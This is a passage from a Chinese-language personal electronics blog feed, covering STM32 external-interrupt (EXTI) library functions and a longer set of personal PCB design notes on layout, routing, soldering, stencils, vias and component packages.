href="#EXTI和NVIC片上外设之间的关系" class="headerlink" title="EXTI和NVIC片上外设之间的关系"></a>EXTI和NVIC片上外设之间的关系</h1><p>EXTI来进行检测，检测到信号以后发送给NVIC。由NVIC来进行处理。</p><p>EXTI是外部中断&#x2F;事件控制器，主要用来通过电平的变化来产生外部中断。之后发给NVIC。</p><h1 id="EXTI编程"><a href="#EXTI编程" class="headerlink" title="EXTI编程"></a>EXTI编程</h1><h2 id="EXTI的初始化结构"><a href="#EXTI的初始化结构" class="headerlink" title="EXTI的初始化结构"></a>EXTI的初始化结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> EXTI_Line;                 <span class="hljs-comment">// 中断/事件线</span><br>    EXTIMode_TypeDef EXTI_Mode;         <span class="hljs-comment">// EXTI模式</span><br>    EXTITrigger_TypeDef EXTI_Trigger;   <span class="hljs-comment">// EXTI边沿触发事件</span><br>    FunctionalState EXTI_LineCmd;       <span class="hljs-comment">// EXTI使能</span><br>&#125; EXTI_InitTypeDef;<br></code></pre></td></tr></table></figure><p>详细解释：</p><ul><li><p>EXTI_Line：EXTI中断&#x2F;事件线选择，可选EXTI0至EXTI19，可参考表 EXTI中断_事件线 选择。</p></li><li><p>EXTI_Mode：EXTI模式选择，可选为产生中断(EXTI_Mode_Interrupt)或者产生事件(EXTI_Mode_Event)。</p></li><li><p>EXTI_Trigger：EXTI边沿触发事件，可选上升沿触发(EXTI_Trigger_Rising)、 下降沿触发( EXTI_Trigger_Falling)或者上升沿和下降沿都触发( EXTI_Trigger_Rising_Falling)。</p></li><li><p>EXTI_LineCmd：控制是否使能EXTI线，可选使能EXTI线(ENABLE)或禁用(DISABLE)。</p></li></ul><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">EXTI_DeInit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//将EXTI的配置全部清除</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">EXTI_Init</span><span class="hljs-params">(EXTI_InitTypeDef* EXTI_InitStruct)</span>;<span class="hljs-comment">//初始化EXTI配置</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">EXTI_StructInit</span><span class="hljs-params">(EXTI_InitTypeDef* EXTI_InitStruct)</span>;<span class="hljs-comment">//使用默认的参数来初始化EXTI</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">EXTI_GenerateSWInterrupt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> EXTI_Line)</span>;<span class="hljs-comment">//创建一个软件中断</span><br>FlagStatus <span class="hljs-title function_">EXTI_GetFlagStatus</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> EXTI_Line)</span>;<span class="hljs-comment">//获取状态位</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">EXTI_ClearFlag</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> EXTI_Line)</span>;<span class="hljs-comment">//清除状态位</span><br>ITStatus <span class="hljs-title function_">EXTI_GetITStatus</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> EXTI_Line)</span>;<span class="hljs-comment">//这个函数一般在中断函数中使用,当然上面这个函数也可以在中断中使用,但是st公司为我们选配了两个选择所以我们最好按照规则来</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">EXTI_ClearITPendingBit</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> EXTI_Line)</span>;<span class="hljs-comment">//清除状态位</span><br></code></pre></td></tr></table></figure><h1 id="中断服务函数的定义"><a href="#中断服务函数的定义" class="headerlink" title="中断服务函数的定义"></a>中断服务函数的定义</h1><p><strong>所有的中断服务函数都需要定义在<code>stm32f10x_it.c</code>中</strong>,并且所有的中断函数名字都是确定的, 这是由于arm公司确定了中断向量表, 我们可以在<code>startup_stm32f10x_hd.s</code>中找到, 当然这个需要根据自己的stm32芯片来选择.</p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>片上外设</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人PCB设计规范</title>
    <link href="/2023/11/20/%E4%B8%AA%E4%BA%BAPCB%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/"/>
    <url>/2023/11/20/%E4%B8%AA%E4%BA%BAPCB%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<p>记载、收集PCB设计规范和基本知识</p><span id="more"></span> <h2 id="分模块布局"><a href="#分模块布局" class="headerlink" title="分模块布局"></a>分模块布局</h2><p>按功能模块：完成同一功能的电路（指由分立元件组成，实现特定功能的模块），应尽量靠近放置。</p><h2 id="按电气性能："><a href="#按电气性能：" class="headerlink" title="按电气性能："></a>按电气性能：</h2><ul><li><p>数字电路区：即怕干扰、又产生干扰</p></li><li><p>模拟电路区：怕干扰</p></li><li><p>功率驱动区：产生干扰</p></li></ul><h3 id="布局原则"><a href="#布局原则" class="headerlink" title="布局原则"></a>布局原则</h3><ul><li><p>较大的元器件优先排布</p></li><li><p>元器件全部放置于顶层（焊接方便）</p></li><li><p>时钟产生器 （晶振等） ：尽量靠近用到该时钟的器件</p></li><li><p>在每个模块的电源输入端 增加去耦电容：滤除电源上的干扰信号。</p></li><li><p>注意尽量靠近取电模块。</p></li><li><p>继电器线圈处加上放电二极管（如 1N4148 ）</p></li></ul><h2 id="PCB-布线规范"><a href="#PCB-布线规范" class="headerlink" title="PCB 布线规范"></a>PCB 布线规范</h2><h3 id="布线原则"><a href="#布线原则" class="headerlink" title="布线原则"></a>布线原则</h3><ul><li>线之间 <strong>避免平行</strong></li><li>勿出现一端浮空（可能产生天线效应）</li><li>走线总长度能短就短</li><li>走线拐弯角度应大于 90°</li><li>3W 规则：当线中心间距不少于 3 倍线宽时，则可保持 70% 的电场不互相干扰</li><li>环路最小规则，走线 尽量不要形成环路</li><li>关键信号处可预留测试点</li><li>元件焊盘两边的引线宽度要一致（用泪滴功能）</li><li>布线完成后开启 泪滴 功能（增加美观度，增强 EMC）</li><li>不在元件焊盘上打过孔（SMT 容易引起漏锡虚焊）</li><li>单片机芯片下面尽量不走线 &#x2F; 不铺铜</li><li>在晶振下方最好不要走线</li></ul><h2 id="特殊元器件的摆放、布线方式"><a href="#特殊元器件的摆放、布线方式" class="headerlink" title="特殊元器件的摆放、布线方式"></a>特殊元器件的摆放、布线方式</h2><h3 id="晶振"><a href="#晶振" class="headerlink" title="晶振"></a>晶振</h3><p>晶振作为一块 <code>PCB</code> 板中的 “心脏” 其是非常重要的。并且晶振也很容易受到电磁干扰，这使得对于晶振的摆放和布线非常重要。</p><p>如果处理不到位的话，晶振可能会不起振。在手焊晶振的时候最好不要将晶振摔到地上，否则容易造成晶体破损。并且要注意焊接的温度，不要长时间的焊接，因为晶振对于温度也是比较敏感的。</p><h4 id="摆放"><a href="#摆放" class="headerlink" title="摆放"></a>摆放</h4><ol><li>晶振不应该在 <code>PCB</code> 板的边缘，晶振内部是石英晶体，如果不慎掉落或受不明撞击，石英晶体易断裂破损，所以晶振的放置远离板边，靠近MCU的位置布局。</li><li>耦合电容应尽量靠近晶振的电源管脚，如果多个耦合电容，容量大的可以放在远一点的位置，小的可以放在近一点的位置。</li><li>晶振则要尽量的靠近MCU。将晶体振荡器尽可能靠近芯片的相应输入和输出引脚。</li><li>尽可能将晶体振荡器隔离到其他设备。由于晶振很容易手的干扰，所以一般不会在晶振周围放置元器件。晶振周围 <code>1mm</code> 禁布器件，<code>0.5mm</code> 禁布过孔走线，所有晶振下不打过孔(包括地过孔)。</li></ol><h4 id="布线"><a href="#布线" class="headerlink" title="布线"></a>布线</h4><ol><li>保持连接晶体、电容器和 IC 振荡器引脚的走线尽可能短且尽可能宽。这不仅会降低噪声耦合的可能性，还会降低寄生电感和电阻。</li><li>晶振的下面不要走线</li><li></li></ol><h2 id="布线顺序"><a href="#布线顺序" class="headerlink" title="布线顺序"></a>布线顺序</h2><h3 id="电源线"><a href="#电源线" class="headerlink" title="电源线"></a>电源线</h3><p>一般走线<br>地线（铺铜）<br>在为 PCB 布线时，我们一般先布电源线，在绝大多数情况下，电源线要求 短、粗、直、较少过孔 ，所以布线优先权最高。</p><p>在完成一般信号线的布线之后，最终我们要铺铜。对于普通双层板，铺铜属性一般设置为 地。</p><p>规则设置<br>走线宽度：</p><p>电源线：30~50 mil<br>信号线：12 mil<br>过孔大小：</p><p>内径：0.45 mm<br>外径：0.75 mm<br>铺铜连接：</p><p>用 Direct 的方式</p><p>（有点解释不清，待有空补充说明</p><p>铺铜安全间距：10 mil<br>属性：GND<br>铺铜选择：Pour Over All Same Net Objectc,<br>去除死铜：Remove Dead Copper<br>字符大小：</p><p>最小线宽：6 mil<br>最小字符高：32 mil<br>小于以上值，印制在板子上的字符可能会不清晰。</p><p>PCB 线宽与电流的关系：</p><table><thead><tr><th>线宽 &#x2F; 铜箔厚度</th><th>70µm（2 oz）</th><th>50µm（1.5 oz）</th><th>35µm（1 oz）</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>2.50mm（98mil）</td><td>6.00A</td><td>5.10A</td><td>4.50A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>2.00mm（78mil）</td><td>5.10A</td><td>4.30A</td><td>4.00A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1.50mm（59mil）</td><td>4.20A</td><td>3.50A</td><td>3.20A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1.20mm（47mil）</td><td>3.60A</td><td>3.00A</td><td>2.70A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1.00mm（40mil）</td><td>3.20A</td><td>2.60A</td><td>2.30A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>0.80mm（32mil）</td><td>2.80A</td><td>2.40A</td><td>2.00A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>0.60mm（24mil）</td><td>2.30A</td><td>1.90A</td><td>1.60A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>0.50mm（20mil）</td><td>2.00A</td><td>1.70A</td><td>1.35A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>0.40mm（16mil）</td><td>1.70A</td><td>1.35A</td><td>1.10A</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="焊接技术"><a href="#焊接技术" class="headerlink" title="焊接技术"></a>焊接技术</h2><ol><li>注意要常在刀头上上一点锡，防止刀头温度过高使得其不便于焊接。</li><li>对于一般的元件焊接而言，其主要的步骤都是：<ol><li>首先焊接少数几个引脚，起到固定的作用</li><li>固定好后，使用镊子进行调位，将每一个引脚都与焊盘对接好。</li><li>将其他引脚进行焊接</li><li>使用助焊剂进行焊接，细化处理防止引脚直接有短接现象。</li><li>最后使用电流表进行测试，确认焊接是否正确。</li></ol></li><li>led灯焊接时需要注意：其是有方向的，一般在PCB图上花了一根横线其就是地，在led灯实物上有绿色的一端就是地。</li></ol><h3 id="焊接的两种方式"><a href="#焊接的两种方式" class="headerlink" title="焊接的两种方式"></a>焊接的两种方式</h3><ol><li>先在焊盘上，上一点锡。然后在将元器件贴上去。</li><li>第二种方法就是，先将元器件贴在焊盘上，然后上锡。<strong>注意这种方法需要焊锡丝比较细，最好是小于等于 0.5mm 的丝。</strong></li></ol><h3 id="进行拆解"><a href="#进行拆解" class="headerlink" title="进行拆解"></a>进行拆解</h3><p>对于一般的元器件来说，拆解是比较简单的。焊锡过多不易分离的时候涂一点助锡膏就好了。但是要拆解排针等连接器类的元器件，需要使用其他方法。当然，所有的拆解都是使用焊枪完成的，但是如果有热风枪的话会更加简单。</p><p><a href="https://www.bilibili.com/video/BV1XH4y1g7Gw/?spm_id_from=333.337.search-card.all.click&vd_source=c45053ab3367ce0770ffe8e9b3dced95">如何拆解排针等连接器元件</a></p><p><strong>实际上，就是使用一根铜丝，涂上助锡膏，然后将锡都引到铜丝上面</strong></p><h2 id="PCB钢网"><a href="#PCB钢网" class="headerlink" title="PCB钢网"></a>PCB钢网</h2><p>在钢网层当中有一些器件是有钢网的，有一些是没有钢网的，我们细心观察一下就知道有钢网的都是贴片器件，没有钢网的都是插件。</p><p>那么是什么原因导致直插器件没有钢网的呢，是否是我们画封装的时候漏掉了呢？其实并不是的，我们先了解一下钢网的作用，大家了解清楚之后就知道为什么只有贴片器件有钢网了。</p><p>首先我们的PCB设计完成之后是要在板厂生产的，生产完成之后还需要在贴片厂进行贴片，贴片又分贴片器件的焊接与直插器件的焊接，这两种类型的器件其所采用的工艺也不同，表贴器件采用的是回流焊工艺焊接，直插器件采用的是波峰焊的工艺焊接（回流焊与波峰焊在之前发布的文章上面有介绍，大家想要了解的话，可以自行查找）</p><p><strong>回流焊</strong>：指的是加热融化预先涂在焊盘上面的锡膏（锡膏一般是由锡粉以及助焊剂混合组成的），使其重新回到流动的液体状态（这一过程就是回流），让预先放置在焊盘上面的器件与焊锡充分接触从而达到焊接的目的。</p><p><strong>波峰焊</strong>：通常是将焊接面直接与高温熔化后的焊锡直接接触形成波峰从而达到焊接的目的。</p><p>我们了解以上的信息之后就会发现，回流焊是要预先在焊盘上面涂覆焊锡，那么把锡膏放置到焊盘上面肯定是需要工具的，我们的钢网层就是在焊接时给贴片封装的焊盘加焊锡膏使用的，钢网就是指在贴片焊盘的对应位置的钢片上开出洞洞，然后在刚片上涂抹焊锡膏，焊锡膏会从洞中落入焊盘，这就是我们钢网的作用，所以我们在EDA软件当中的钢网层是只存在于贴片器件之中的，这就是为什么插件没有钢网的原因。</p><p>那我们的钢网层是否需要和阻焊层一样进行外扩呢，其实这个是不需要的，外扩主要是针对我们的阻焊层来说的，钢网层的尺寸是需要和焊盘尺寸等大的，这样才可以精确的给我们的焊盘涂上焊锡。</p><h2 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h2><p>目前全球 EDA 产业格局主要由 <strong>Synopsys</strong> (新思科技)、<strong>Cadence</strong> (铿腾电子)、<strong>Mentor</strong>（明导电子） 三大企业垄断，其中 Cadence 公司的 <strong>Allegro</strong>(<code>/əˈleɡroʊ/</code>) 是业内比较推崇的一款高速 PCB 板级布线工具，当然面对价格不菲的商业 License，也可以选择免费又好用的 <code>KiCad</code>。</p><p>PCB 是<strong>印刷电路板</strong>（Printed Circuit Board）的英文缩写，其基材是由<strong>介电层</strong>（绝缘材料）和<strong>高纯度导体</strong> (铜箔)构成，常用的 PCB 的基材主要是<strong>覆铜箔环氧玻纤布层压板</strong>，也称为<strong>FR-4 全玻纤板</strong>，使用浸润了环氧树脂的<strong>玻璃纤维布</strong>层压而成。</p><ul><li><strong>网络</strong>：电路也称为网络，即<strong>电路网络</strong>；</li><li><strong>板框</strong>：放置 PCB 封装之前，需要先行在相应的图层绘制 PCB 板的边框；</li><li><strong>飞线</strong>：是基于相同的原理图网络产生的，当两个封装的焊盘网络相同时就会出现飞线，表示这两个焊盘在 PCB 当中可以通过导线连接；</li><li><strong>焊盘</strong>：用于将电子元件固定并且连接到 PCB ，每个焊盘都拥有独立编号，以便于和元件引脚对应；</li><li><strong>泪滴</strong>：平滑过渡布线与焊盘之间的连接，提高连接的可靠性，降低信号传输时阻抗的急剧跳变，避免高频信号由于线宽突然减小而造成反射；</li><li><strong>铺铜</strong>：用于保留连接<strong>地</strong>或者<strong>电源</strong>的整块铜箔区域，一块 PCB 可以分别设置并且绘制多个铺铜区；</li></ul><h3 id="布线-1"><a href="#布线-1" class="headerlink" title="布线"></a>布线</h3><ul><li><strong>差分对布线</strong>：<strong>差分对</strong>是一种有效的高速信号走线方式，可以抑制共模噪声，达到更好的信号完整性；其中，<strong>等长</strong>和<strong>等距</strong>是差分布线的最基本要求；</li><li><strong>蛇形等长布线</strong>：<strong>蛇形走线</strong>用于解决高速信号下，线长不相等导致的并行信号到达时间差异，进而引发信号时序的改变；其没有所谓滤波或者抗干扰的能力，因而只适用于<strong>时序匹配</strong>用途；</li></ul><h3 id="拼板"><a href="#拼板" class="headerlink" title="拼板"></a>拼板</h3><ul><li><strong>拼板</strong>：用于充分利用 PCB 板材，将多块相同或者不同的 PCB 设计放置到一个上面，从而提高生产效率；</li><li><strong>V 割</strong>：也称为 <code>V-CUT</code>，是指板厂按照客户的拼板要求（便于后期<strong>分板</strong>），在印刷电路板的特定位置预先使用切割机开出 <strong>V</strong> 形槽，由于 V-CUT 刀只能走直线，不能走曲线和折线，所以规则的 PCB 拼板才会采用该方式；此外，PCB 走线距离 V 割线距离不应小于<code>0.4mm</code> 以避免损坏；</li><li><strong>邮票孔</strong>：一种是为了便于后期分板，在分板位置打上一些小孔，由于容易造成毛边等问题，所以仅用于拼板不规则的场合；</li><li><strong>半孔</strong>：通常用于制作核心板引脚，即被精确切割为一半的<strong>过孔</strong>；</li></ul><h3 id="过孔"><a href="#过孔" class="headerlink" title="过孔"></a>过孔</h3><p><strong>过孔</strong>（<code>Via Hole</code>）是镀铜的的金属小孔，用于实现不同铜层之间的电气连接，具体可以划分为如下 3 种：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111857545.png"></p><ol><li><strong>通孔</strong>（<code>Through</code>）：连接顶层与底层并贯穿整个 PCB；</li><li><strong>盲孔</strong>（<code>Blind</code>）：一端位于 PCB 表面，另一端位于 PCB 中间的工作层；</li><li><strong>埋孔</strong>（<code>Buried</code>）：用于 PCB 内部中间两个工作层之间的连接；</li></ol><blockquote><p><strong>注意</strong>：出于信号完整性的考虑，PCB 设计当中应该尽量减少<strong>过孔</strong>的使用；如果必须使用过孔，则尽量避免采用<strong>盲孔</strong>和<strong>埋孔</strong>，它们不但增加了 PCB 的加工难度，也带来了大量电气安全性方面的问题。</p></blockquote><h4 id="过孔的寄生电容"><a href="#过孔的寄生电容" class="headerlink" title="过孔的寄生电容"></a>过孔的寄生电容</h4><p>过孔本身存在着对地的寄生电容，过孔的寄生电容会<strong>延长传输信号的上升时间</strong>，例如一块厚度为 <code>50mil</code> 的 PCB 板材，对于直径为 <code>20mil</code> 内径为 <code>10mil</code> 的过孔，其与接地覆铜区的距离为 <code>32mil</code>，则该过孔的寄生电容约为 <code>0.5pF</code>。</p><p>虽然单个过孔的寄生电容对于信号上升沿的变缓作用不明显，但是如果在走线过程当中，多次使用过孔进行层间切换，则寄生电容的影响将会直线上升。</p><h4 id="过孔的寄生电感"><a href="#过孔的寄生电感" class="headerlink" title="过孔的寄生电感"></a>过孔的寄生电感</h4><p>过孔在存在寄生电容的同时，也存在着寄生电感，在高速数字电路当中，过孔寄生电感所带来的危害往往大于寄生电容，多个过孔产生的串联寄生电感会削弱旁路电容的作用，从而降低整个电源系统的滤波效果。</p><p>特别是对于<strong>旁路电容</strong>，其在连接电源层与地层的时候，往往需要使用到两个过孔，这样带来的寄生电感会成倍增加，使用时需要额外注意。</p><h3 id="阻焊"><a href="#阻焊" class="headerlink" title="阻焊"></a>阻焊</h3><p>阻焊也称为<strong>焊接掩模</strong>（Solder Mask），是指 PCB 上需要覆盖阻焊油墨的部分，阻焊层通常使用<strong>负片输出</strong>，所以阻焊层形状映射到 PCB 之后，并不是为了填充阻焊油墨，而是为了暴露出铜箔。</p><h4 id="阻焊桥"><a href="#阻焊桥" class="headerlink" title="阻焊桥"></a>阻焊桥</h4><p><strong>阻焊桥</strong>是贴片元件之间的阻焊（两个阻焊开窗之间保留阻焊油的宽度，通常大于 <code>6mil</code>），主要用于防止焊盘在焊接时连锡短路。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111857219.png"></p><h4 id="阻焊开窗"><a href="#阻焊开窗" class="headerlink" title="阻焊开窗"></a>阻焊开窗</h4><p><strong>阻焊开窗</strong>是指覆铜板不盖油墨的部分，即暴露出 PCB 表面的铜泊部分。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111857986.png"></p><h4 id="包地"><a href="#包地" class="headerlink" title="包地"></a>包地</h4><p><strong>包地</strong>是指使用<strong>接地网络</strong>将信号线包住，从而达到降低<strong>串扰</strong>的目的。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111858406.png"></p><h4 id="Fanout-扇出"><a href="#Fanout-扇出" class="headerlink" title="Fanout 扇出"></a>Fanout 扇出</h4><p><strong>扇出</strong>（Fanout [fænaʊt]）设计是在 PCB 布局完成之后，进行布线之前的一项工作。目的是通过一段<code>走线</code>和<code>过孔</code>把原来只存在于表层的贴片元件焊盘连接至 PCB 内层，这样在后期进行内层布线的时候，就可以不用关注表层的贴片元件焊盘，而只需要对 Fanout 出来的过孔进行连接即可。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404111859376.png"></p><h3 id="单位换算"><a href="#单位换算" class="headerlink" title="单位换算"></a>单位换算</h3><p><strong>密耳</strong>是 PCB 设计当中经常使用到的一个长度的单位，它代表<code>千分之一英寸</code>，通常写做 <code>mil</code>，其换算方式如下所示：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">1 mm   (毫米)   ➜  39.37  mil (密耳)<br>1 mil  (密耳)   ➜  0.0254 mm  (毫米)  ➜  25.4 μm (微米)<br>1 inch (英寸)   ➜  1000   mil (密耳)  ➜  25.4 mm (毫米)<br></code></pre></td></tr></table></figure><h2 id="元件封装"><a href="#元件封装" class="headerlink" title="元件封装"></a>元件封装</h2><p><strong>封装</strong>（Package）描述了电子元器件的外形与尺寸，具有相同电子参数的元件可能拥有不同的封装，由于封装技术日新月异并且没有统一标准，本文总结了一些常用电子元件的封装类型。</p><h3 id="贴片元件"><a href="#贴片元件" class="headerlink" title="贴片元件"></a>贴片元件</h3><p><strong>SMT</strong> 是<strong>表面贴装技术</strong>（Surface Mounting Technology）的英文缩写，常见的贴片元件有 <strong>0201</strong>、<strong>0402</strong>、<strong>0805</strong>、<strong>0603</strong>、<strong>1206</strong>、<strong>1210</strong>、<strong>1812</strong>、<strong>2010</strong>、<strong>2512</strong> 九种类型：</p><table><thead><tr><th>英制（mil）</th><th>长（mm）</th><th>宽（mm）</th><th>高（mm）</th><th>额定功率（电阻）</th><th>最大工作电压（电阻）</th><th>公制（mm）</th></tr></thead><tbody><tr><td><strong>0201 封装</strong></td><td><code>0.60 毫米 ± 0.05</code></td><td><code>0.30 毫米 ± 0.05</code></td><td><code>0.23 毫米 ± 0.05</code></td><td><code>1/20 W</code></td><td><code>25V</code></td><td>0603</td></tr><tr><td><strong>0402 封装</strong></td><td><code>1.00 毫米 ± 0.10</code></td><td><code>0.50 毫米 ± 0.10</code></td><td><code>0.30 毫米 ± 0.10</code></td><td><code>1/16 W</code></td><td><code>50V</code></td><td>1005</td></tr><tr><td><strong>0603 封装</strong></td><td><code>1.60 毫米 ± 0.15</code></td><td><code>0.80 毫米 ± 0.15</code></td><td><code>0.40 毫米 ± 0.10</code></td><td><code>1/10 W</code></td><td><code>50V</code></td><td>1608</td></tr><tr><td><strong>0805 封装</strong></td><td><code>2.00 毫米 ± 0.20</code></td><td><code>1.25 毫米 ± 0.15</code></td><td><code>0.50 毫米 ± 0.10</code></td><td><code>1/8 W</code></td><td><code>150V</code></td><td>2012</td></tr><tr><td><strong>1206 封装</strong></td><td><code>3.20 毫米 ± 0.20</code></td><td><code>1.60 毫米 ± 0.15</code></td><td><code>0.55 毫米 ± 0.10</code></td><td><code>1/4 W</code></td><td><code>200V</code></td><td>3216</td></tr><tr><td><strong>1210 封装</strong></td><td><code>3.20 毫米 ± 0.20</code></td><td><code>2.50 毫米 ± 0.20</code></td><td><code>0.55 毫米 ± 0.10</code></td><td><code>1/3 W</code></td><td><code>200V</code></td><td>3225</td></tr><tr><td><strong>1812 封装</strong></td><td><code>4.50 毫米 ± 0.20</code></td><td><code>3.20 毫米 ± 0.20</code></td><td><code>0.55 毫米 ± 0.10</code></td><td><code>1/2 W</code></td><td><code>200V</code></td><td>4832</td></tr><tr><td><strong>2010 封装</strong></td><td><code>5.00 毫米 ± 0.20</code></td><td><code>2.50 毫米 ± 0.20</code></td><td><code>0.55 毫米 ± 0.10</code></td><td><code>3/4 W</code></td><td><code>200V</code></td><td>5025</td></tr><tr><td><strong>2512 封装</strong></td><td><code>6.40 毫米 ± 0.20</code></td><td><code>3.20 毫米 ± 0.20</code></td><td><code>0.55 毫米 ± 0.10</code></td><td><code>1 W</code></td><td><code>200V</code></td><td>6432</td></tr></tbody></table><h3 id="芯片封装"><a href="#芯片封装" class="headerlink" title="芯片封装"></a>芯片封装</h3><p>半导体芯片的封装材料主要有<code>塑料</code>、<code>陶瓷</code>、<code>玻璃</code>、<code>金属</code>等等，如果没有特殊工艺要求，现在普遍采用的是塑料封装：</p><table><thead><tr><th>封装缩写</th><th>封装名称</th><th>说明</th></tr></thead><tbody><tr><td><strong>MELF</strong></td><td>Metal Electrode Face Components</td><td><strong>金属电极无引线端面元器件</strong></td></tr><tr><td><strong>SOT</strong></td><td>Small Outline Transistor</td><td><strong>小外形晶体管</strong></td></tr><tr><td><strong>SOD</strong></td><td>Small Outline Diode</td><td><strong>小外形二极管</strong></td></tr><tr><td><strong>SOIC</strong></td><td>Small Outline Integrated Circuits</td><td><strong>小外形集成电路</strong></td></tr><tr><td><strong>SSOIC</strong></td><td>Shrink Small Outline Integrated Circuits</td><td><strong>缩小外形集成电路</strong></td></tr><tr><td><strong>SOP</strong></td><td>Small Outline Package Integrated Circuits</td><td><strong>小外形封装集成电路</strong></td></tr><tr><td><strong>SSOP</strong></td><td>Shrink Small Outline Package Integrated Circuits</td><td><strong>缩小外形封装集成电路</strong></td></tr><tr><td><strong>TSOP</strong></td><td>Thin Small Outline Package</td><td><strong>薄小外形封装</strong></td></tr><tr><td><strong>TSSOP</strong></td><td>Thin Shrink Small Outline Package</td><td><strong>薄缩小外形封装</strong></td></tr><tr><td><strong>SOJ</strong></td><td>Small Outline Integrated Circuits with J Leads</td><td><strong>J 形引脚小外形集成电路</strong></td></tr><tr><td><strong>CFP</strong></td><td>Ceramic Flat Packs</td><td><strong>陶瓷扁平封装</strong></td></tr><tr><td><strong>PQFP</strong></td><td>Plastic Quad Flat Pack</td><td><strong>塑料方形扁平封装</strong></td></tr><tr><td><strong>SQFP</strong></td><td>Shrink Quad Flat Pack</td><td><strong>缩小方形扁平封装</strong></td></tr><tr><td><strong>CQFP</strong></td><td>Ceramic Quad Flat Pack</td><td><strong>陶瓷方形扁平封装</strong></td></tr><tr><td><strong>PLCC</strong></td><td>Plastic Leaded Chip Carriers</td><td><strong>塑料封装有引线芯片载体</strong></td></tr><tr><td><strong>LCC</strong></td><td>Leadless Ceramic Chip Carriers</td><td><strong>无引线陶瓷芯片载体</strong></td></tr><tr><td><strong>QFN</strong></td><td>Quad Flat Non-leaded Package</td><td><strong>四侧无引脚扁平封装</strong></td></tr><tr><td><strong>DIP</strong></td><td>Dual-In-Line Components</td><td><strong>双列引脚元器件</strong></td></tr><tr><td><strong>PBGA</strong></td><td>Plastic Ball Grid Array</td><td><strong>塑封球栅阵列器件</strong></td></tr><tr><td><strong>AX</strong></td><td>Non-polarized Axial-Leaded Discretes</td><td><strong>无极性轴向引脚分立元件</strong></td></tr><tr><td><strong>CPAX</strong></td><td>Polarized Capacitor, Axial</td><td><strong>带极性轴向引脚电容</strong></td></tr><tr><td><strong>CPC</strong></td><td>Polarized Capacitor, Cylindricals</td><td><strong>带极性圆柱形电容</strong></td></tr><tr><td><strong>CYL</strong></td><td>Non-polarized Cylindricals</td><td><strong>无极性圆柱形元器件</strong></td></tr><tr><td><strong>DISC</strong></td><td>Non-polarized Offset-Leaded Discs</td><td><strong>无极性偏置引脚分立元件</strong></td></tr><tr><td><strong>RAD</strong></td><td>Non-polarized Radial-Leaded Discretes</td><td><strong>无极性径向引脚分立元件</strong></td></tr><tr><td><strong>TO</strong></td><td>Transistors Outlines</td><td><strong>晶体管外形</strong></td></tr><tr><td><strong>PGA</strong></td><td>Plastic Grid Array</td><td><strong>塑封阵列器件</strong></td></tr><tr><td><strong>SIP</strong></td><td>Single-In-Line Components</td><td><strong>单排引脚元器件</strong></td></tr></tbody></table><h2 id="布线参数"><a href="#布线参数" class="headerlink" title="布线参数"></a>布线参数</h2><p>目前 PCB 板厂默认采用 <code>1.6</code> 毫米厚度的 <strong>FR-4</strong> 板材：</p><ul><li><strong>外层铜厚</strong>：<code>1oz ~ 2oz</code>，即<code>35um ~ 70um</code>，默认常规电路板外层铜箔厚度为<code>1 oz</code>，最多可以做到<code>2 oz</code>（需备注）；</li><li><strong>内层铜厚</strong>：<code>0.5oz</code>，即 <code>17um</code>，默认常规电路板内层铜箔线路厚度为 <code>0.5 oz</code>；</li><li><strong>最小线宽与间隙</strong>：嘉立创<code>3.5mil</code>，捷配<code>4mil</code>，两者约等于 <code>0.1mm</code>，实际布线时尽量保证大于 <code>4mil</code> 即可；</li><li><strong>最小过孔内外径</strong>：多层板最小内径 